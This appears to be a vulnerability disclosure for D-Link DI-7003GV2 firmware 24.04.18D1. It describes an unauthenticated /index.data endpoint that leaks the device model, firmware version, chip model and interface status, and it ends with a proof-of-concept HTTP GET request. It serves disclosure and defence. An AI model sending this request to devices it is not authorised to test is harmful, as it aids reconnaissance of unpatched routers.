# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 contains an information disclosure vulnerability in the `/index.data` endpoint. This unauthenticated interface allows remote attackers to access sensitive device details, including the device model, firmware version, chip model, and network interface status. 

# Vulnerability details

The handling function for `index.data` interface is `sub_4357BC`.

![图 0](img/5b69399b93e6f6b5917951633b3c1c206766f8151e1e92420284f525a030087c.png)  

The function `sub_4357BC` will output sensitive information such as device model, version, and chip model.

![图 1](img/aa30bb65b5daa6c193f24d0c57bc84299ad2659b4c0f25f243b5d4811a7a19d8.png)  



# Poc

```http
GET /index.data HTTP/1.1
Host: 192.168.140.240
Content-Length: 0
Cache-Control: max-age=0
Origin: http://192.168.140.240
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```

![图 2](img/93425c1774b4402a704219d2ab275053afef958799cf069c02ead5fda38aa518.png)  
